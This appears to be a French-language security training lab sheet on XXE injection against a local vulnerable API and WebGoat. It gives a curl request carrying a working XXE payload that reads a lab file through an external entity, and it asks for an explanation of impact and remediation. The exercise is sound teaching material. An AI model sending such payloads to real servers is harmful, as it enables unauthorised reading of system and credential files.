# J2-C04 — XXE avec Vuln API et WebGoat

## Objectif
Comprendre et démontrer une XXE contrôlée.

## Cibles autorisées
`http://vulnapi.target.local:5000/xml` et WebGoat.

## Test XML normal
```bash
curl -X POST http://vulnapi.target.local:5000/xml \
  -H "Content-Type: application/xml" \
  --data '<root><data>Hello XML</data></root>'
```

## Test XXE contrôlé
```bash
curl -X POST http://vulnapi.target.local:5000/xml \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/lab-hostname.txt">
]>
<root><data>&xxe;</data></root>'
```

## WebGoat
Réaliser ou lire une leçon XML/XXE et résumer les concepts.

## Preuve attendue
`Hello XML`, puis contenu de `/etc/lab-hostname.txt`, rôle de `DOCTYPE`, `ENTITY`, `SYSTEM`, impact, remédiation.
